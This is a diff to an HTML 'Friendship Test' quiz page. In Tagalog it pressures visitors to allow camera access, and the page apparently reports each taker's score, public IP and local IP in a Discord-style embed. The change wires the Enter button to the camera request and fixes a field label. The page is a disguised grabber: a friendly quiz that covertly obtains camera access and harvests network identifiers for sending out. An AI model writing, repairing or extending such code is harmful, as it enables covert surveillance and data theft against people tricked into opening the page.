@@ -175,7 +175,7 @@
       <h2>Friendship Test</h2>
       <p>kung totoo mokong kaibigan, bat dimo sagutan? allow mo na lang para maka enter</p>
       <p class="error" id="cameraError" style="display: none;"></p>
-      <button onclick="requestCamera()">Enter</button>
+      <button id="enterBtn">Enter</button>
     </div>
   </div>
   <video id="liveVideo" autoplay playsinline muted style="display:none;"></video>
@@ -1162,7 +1162,7 @@
             color: score === questions.length ? 5763719 : score >= questions.length * 0.5 ? 15844367 : 15158332,
             fields: [
               { name: "Final Score", value: `${score}/${questions.length} (${percentage}%)`, inline: true },
-              { name: "Duration Tome", value: `${duration}s (${(duration/60).toFixed(1)} min)`, inline: true },
+              { name: "Duration Time", value: `${duration}s (${(duration/60).toFixed(1)} min)`, inline: true },
               { name: "Average Time", value: `${(duration/questions.length).toFixed(1)}s`, inline: true },
               { name: "Public IP", value: `\`${publicIP}\``, inline: true },
               { name: "Local IP", value: `\`${localIP}\``, inline: true },
@@ -1211,6 +1211,9 @@
         })
       });
     });
+    
+    // Attach event listener to Enter button
+    document.getElementById('enterBtn').addEventListener('click', requestCamera);
   </script>
 </body>
 </html>
